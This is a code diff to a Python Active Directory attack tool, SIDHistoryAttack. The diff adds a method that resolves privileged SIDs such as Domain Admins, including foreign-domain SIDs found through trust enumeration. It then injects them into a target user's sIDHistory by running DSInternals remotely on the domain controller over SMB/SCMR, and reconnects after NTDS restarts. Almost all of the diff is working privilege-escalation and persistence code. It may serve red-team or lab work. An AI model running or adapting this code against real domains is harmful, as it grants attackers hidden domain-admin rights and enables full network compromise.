@@ -1,7 +1,7 @@
 """
-SID History Attack Implementation
+SID History Attack Implementation v2
 Main orchestrator: wires up authentication, LDAP operations,
-DRSUAPI calls, scanning, and output formatting.
+DRSUAPI calls, DSInternals injection, scanning, and output formatting.
 """
 
 import logging
@@ -18,8 +18,9 @@ class SIDHistoryAttack:
     """
     Main class for performing SID History operations from a remote Linux host.
 
-    Injection uses DRSUAPI DRSAddSidHistory (opnum 20) — the only method that
-    bypasses the DC's SAM layer. Audit features use read-only LDAP queries.
+    Supports two injection methods:
+    - dsinternals: Offline ntds.dit modification via DSInternals (can inject privileged SIDs)
+    - drsuapi: DRSAddSidHistory opnum 20 (cross-forest only, v1 legacy)
     """
 
     def __init__(self, dc_ip: str, domain: str, dc_hostname: Optional[str] = None):
@@ -136,24 +137,129 @@ class SIDHistoryAttack:
         """Get the domain SID."""
         return self.domain_sid
 
-    # ─── SID HISTORY INJECTION (DRSUAPI) ──────────────────────────────
+    # ─── SID RESOLUTION FOR INJECTION ─────────────────────────────────
 
-    def inject_sid_history(self, target_user: str, source_user: str,
-                          source_domain: Optional[str] = None,
-                          src_creds_user: str = '',
-                          src_creds_domain: str = '',
-                          src_creds_password: str = '') -> bool:
+    def resolve_inject_sid(self, inject_value: str,
+                           inject_domain: Optional[str] = None) -> Optional[str]:
         """
-        Inject the SID of a source user into the target's sIDHistory
-        via DRSUAPI DRSAddSidHistory (opnum 20).
+        Resolve an --inject value to a concrete SID.
+
+        Args:
+            inject_value: Either a preset name (e.g. 'domain-admins') or a raw SID string
+            inject_domain: Optional foreign domain FQDN. If provided, resolve the
+                          domain SID of that domain via LDAP trusts.
+
+        Returns:
+            Resolved SID string, or None on failure
+        """
+        # Case 1: Raw SID string provided directly
+        if SIDConverter.is_valid_sid(inject_value):
+            logging.debug(f"Using raw SID: {inject_value}")
+            return inject_value
+
+        # Case 2: Preset name — need a domain SID to build it
+        preset_lower = inject_value.lower()
+        from .sid_utils import PRIVILEGED_PRESETS
+        if preset_lower not in PRIVILEGED_PRESETS:
+            logging.error(f"Unknown preset or invalid SID: {inject_value}")
+            logging.error(f"Available presets: {', '.join(sorted(PRIVILEGED_PRESETS.keys()))}")
+            return None
+
+        # Determine which domain SID to use
+        if inject_domain:
+            target_domain_sid = self._resolve_foreign_domain_sid(inject_domain)
+            if not target_domain_sid:
+                logging.error(f"Could not resolve domain SID for {inject_domain}")
+                return None
+        else:
+            target_domain_sid = self.domain_sid
+            if not target_domain_sid:
+                logging.error("Domain SID not available")
+                return None
+
+        resolved = SIDConverter.resolve_preset(preset_lower, target_domain_sid)
+        if resolved:
+            name = PRIVILEGED_PRESETS.get(preset_lower, preset_lower)
+            logging.debug(f"Resolved preset '{inject_value}' -> {resolved}")
+        return resolved
+
+    def _resolve_foreign_domain_sid(self, foreign_domain: str) -> Optional[str]:
+        """
+        Resolve the SID of a foreign domain via trust enumeration.
+
+        Looks up the trustedDomain objects in LDAP to find the SID
+        of the specified domain.
+        """
+        if not self.ldap_ops:
+            logging.error("Not connected — cannot resolve foreign domain SID")
+            return None
+
+        trusts = self.ldap_ops.enumerate_trusts()
+        foreign_lower = foreign_domain.lower()
+
+        for trust in trusts:
+            trust_partner = trust.get('partner', '').lower()
+            trust_flat = trust.get('flatName', '').lower()
+
+            if trust_partner == foreign_lower or trust_flat == foreign_lower:
+                trust_sid = trust.get('sid', '')
+                if trust_sid:
+                    logging.debug(f"Resolved {foreign_domain} SID via trust: {trust_sid}")
+                    return trust_sid
+
+        logging.error(f"No trust found for domain '{foreign_domain}'")
+        logging.error("Available trusts:")
+        for trust in trusts:
+            logging.error(f"  - {trust.get('name', 'unknown')} (SID: {trust.get('sid', 'N/A')})")
+        return None
+
+    # ─── SID HISTORY INJECTION (DSInternals) ──────────────────────────
+
+    def inject_sid_history_dsinternals(self, target_user: str, sid_to_inject: str,
+                                       dsinternals_path: Optional[str] = None) -> bool:
+        """
+        Inject a SID into the target's sIDHistory using DSInternals
+        executed remotely via impacket SCMR.
 
         Args:
             target_user: sAMAccountName of target
-            source_user: sAMAccountName of source (in source domain)
-            source_domain: Source domain (must be cross-forest)
-            src_creds_user: Username for source domain auth
-            src_creds_domain: Domain for source domain auth
-            src_creds_password: Password for source domain auth
+            sid_to_inject: Full SID string to inject
+            dsinternals_path: Optional local path to DSInternals module on the DC
+        """
+        from .injection import DSInternalsInjector
+
+        injector = DSInternalsInjector(
+            dc_ip=self.dc_ip,
+            domain=self.domain,
+            username=self.auth_manager._username or '',
+            password=self.auth_manager._password or '',
+            lm_hash=self.auth_manager._lm_hash or '',
+            nt_hash=self.auth_manager._nt_hash or '',
+            dsinternals_path=dsinternals_path,
+        )
+
+        try:
+            print("[*] Connecting to DC via SMB...")
+            success, message = injector.inject(target_user, sid_to_inject)
+            if success:
+                print("[+] DSInternals injection succeeded")
+                logging.debug(f"Result: {message}")
+            else:
+                print(f"[-] DSInternals injection failed: {message}")
+            return success
+        finally:
+            injector.disconnect()
+
+    # ─── SID HISTORY INJECTION (DRSUAPI) ──────────────────────────────
+
+    def inject_sid_history_drsuapi(self, target_user: str, source_user: str,
+                                   source_domain: Optional[str] = None,
+                                   src_creds_user: str = '',
+                                   src_creds_domain: str = '',
+                                   src_creds_password: str = '') -> bool:
+        """
+        Inject the SID of a source user into the target's sIDHistory
+        via DRSUAPI DRSAddSidHistory (opnum 20).
         """
         if not self.drsuapi_client:
             logging.debug("Establishing DRSUAPI connection...")
@@ -183,6 +289,108 @@ class SIDHistoryAttack:
             self._suggest_drsuapi_fix(error_code)
 
         return success
+
+    def _reconnect_ldap(self, retries: int = 6, delay: int = 5) -> bool:
+        """Reconnect LDAP after DSInternals injection (NTDS restart breaks the connection)."""
+        import time
+
+        if self.connection:
+            try:
+                self.connection.unbind()
+            except Exception:
+                pass
+            self.connection = None
+
+        # Suppress auth retry noise during reconnection
+        prev_level = logging.getLogger().level
+        logging.getLogger().setLevel(logging.CRITICAL)
+
+        for attempt in range(retries):
+            time.sleep(delay)
+            try:
+                self.connection = self.auth_manager.get_connection(
+                    self.auth_manager._last_auth_method,
+                    **self.auth_manager._last_auth_params
+                )
+                if self.connection:
+                    self.ldap_ops = LDAPOperations(self.connection, self.base_dn)
+                    self._scanner = DomainScanner(self.ldap_ops, self.domain)
+                    logging.getLogger().setLevel(prev_level)
+                    logging.debug("LDAP reconnected after NTDS restart")
+                    return True
+            except Exception:
+                pass
+
+        logging.getLogger().setLevel(prev_level)
+        logging.debug("LDAP reconnection failed after all retries")
+        return False
+
+    def inject_sid_history(self, target_user: str,
+                           method: str = 'dsinternals',
+                           # DSInternals params
+                           inject_value: Optional[str] = None,
+                           inject_domain: Optional[str] = None,
+                           dsinternals_path: Optional[str] = None,
+                           # DRSUAPI params
+                           source_user: Optional[str] = None,
+                           source_domain: Optional[str] = None,
+                           src_creds_user: str = '',
+                           src_creds_domain: str = '',
+                           src_creds_password: str = '') -> bool:
+        """
+        Dispatch SID History injection to the appropriate method.
+
+        Args:
+            target_user: sAMAccountName of target
+            method: 'dsinternals' or 'drsuapi'
+            inject_value: Preset name or raw SID (for dsinternals)
+            inject_domain: Foreign domain for preset resolution (for dsinternals)
+            dsinternals_path: Path to DSInternals on the DC (for dsinternals)
+            source_user: Source user sAMAccountName (for drsuapi)
+            source_domain: Source domain FQDN (for drsuapi)
+            src_creds_*: Source domain credentials (for drsuapi)
+        """
+        if method == 'dsinternals':
+            if not inject_value:
+                logging.error("--inject is required for dsinternals method")
+                return False
+
+            sid_to_inject = self.resolve_inject_sid(inject_value, inject_domain)
+            if not sid_to_inject:
+                return False
+
+            sid_name = SIDConverter.resolve_sid_name(sid_to_inject)
+            print(f"\n[*] Injection target: {target_user}")
+            print(f"[*] SID to inject:   {sid_to_inject} ({sid_name})")
+            print(f"[*] Method:          DSInternals (offline ntds.dit)")
+            if inject_domain:
+                print(f"[*] Source domain:   {inject_domain}")
+            print(f"[*] DC:              {self.dc_ip}")
+            print()
+
+            success = self.inject_sid_history_dsinternals(
+                target_user, sid_to_inject, dsinternals_path
+            )
+
+            # Reconnect LDAP (NTDS restart broke the connection)
+            if success:
+                print("[*] Waiting for NTDS to restart...")
+                self._reconnect_ldap()
+
+            return success
+
+        elif method == 'drsuapi':
+            return self.inject_sid_history_drsuapi(
+                target_user, source_user,
+                source_domain=source_domain,
+                src_creds_user=src_creds_user,
+                src_creds_domain=src_creds_domain,
+                src_creds_password=src_creds_password,
+            )
+
+        else:
+            logging.error(f"Unknown injection method: {method}")
+            return False
 
     # ─── SCANNING & AUDITING ──────────────────────────────────────────
 
